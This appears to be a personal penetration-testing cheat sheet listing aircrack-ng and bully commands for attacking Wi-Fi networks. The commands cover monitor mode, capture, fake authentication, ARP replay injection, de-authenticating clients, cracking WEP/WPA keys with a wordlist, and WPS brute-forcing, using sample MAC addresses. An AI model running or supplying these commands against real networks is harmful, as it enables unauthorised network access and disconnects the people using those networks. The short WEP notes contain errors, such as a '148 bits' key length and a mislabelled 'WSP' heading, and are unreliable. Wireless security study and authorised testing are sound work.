# List APs

iwlist wlan0 scan

# Monitor mode

airmon-ng check
airmon-ng check kill
airmon-ng start wlan0

# Capture

airodump-ng mon0 --channel 6
airodump-ng -w book mon0 --channel 6

# Injecting - Fake Auth (-1)

aireplay-ng -1 0 -e linksys -a 00:23:69:F5:B4:2B -h 00:C0:CA:1B:69:AA mon0

# Injecting - ARP Request Replay

aireplay-ng -3 -b 00:23:69:F5:B4:2B -h 00:C0:CA:1B:69:AA mon0

# Injection - De-auth

aireplay-ng -0 1 -a 00:23:69:F5:B4:2B -c 70:56:81:B2:F0:53 mon0

# Cracking

aircrack-ng -b 00:23:69:F5:B4:2B book*.cap

# Cracking with Word list

aircrack-ng -w password.lst -b 00:23:69:F5:B4:2B pentestbook2*.cap

#WEP

* The shared WEP key can be either 64 or 148 bits.
* First 24 bits of the key to add randomness.
* .:. Effective key length really only 40 or 104 bits.

#WSP

bully mon0 -b 00:23:69:F5:B4:2B -e linksys -c 6
